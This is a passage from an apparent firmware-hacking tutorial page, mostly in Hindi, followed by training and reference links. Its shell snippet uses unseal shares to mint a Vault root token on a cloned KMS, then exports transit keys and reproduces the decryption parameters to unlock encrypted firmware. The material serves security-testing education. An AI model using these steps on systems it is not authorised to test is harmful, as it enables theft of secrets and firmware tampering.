vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
क्लोन किए गए KMS पर root के साथ:

- transit keys को केवल isolated clone के अंदर exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- recovered RSA key को KMS द्वारा उपयोग किए गए exact padding/hash pair के साथ आज़माएं। विफल PKCS#1 v1.5 decrypt और विफल default OAEP decrypt यह **सिद्ध नहीं करते** कि key गलत है; कई Vault-backed flows SHA-256 के साथ OAEP का उपयोग करते हैं, जबकि common libraries default रूप से SHA-1 का उपयोग करती हैं।
- यदि payload `Salted__` से शुरू होता है, तो AES-CBC decryption का प्रयास करने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, legacy appliances पर अक्सर MD5) को ठीक उसी तरह reproduce करें।

इससे "encrypted firmware" एक अधिक सामान्य समस्या में बदल जाता है: **पहले appliance-side operational keys recover करें, फिर exact unwrap + KDF parameters को offline reproduce करें**।

## Training और Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमला करने की Definitive Guide](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [त्यागे गए hardware में zero days का Exploitation – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20 के Smart Device ने मुझे आपके घर तक Access कैसे दिया](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - इसके charge port connector से Tesla Wall Connector का Exploiting - Part 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
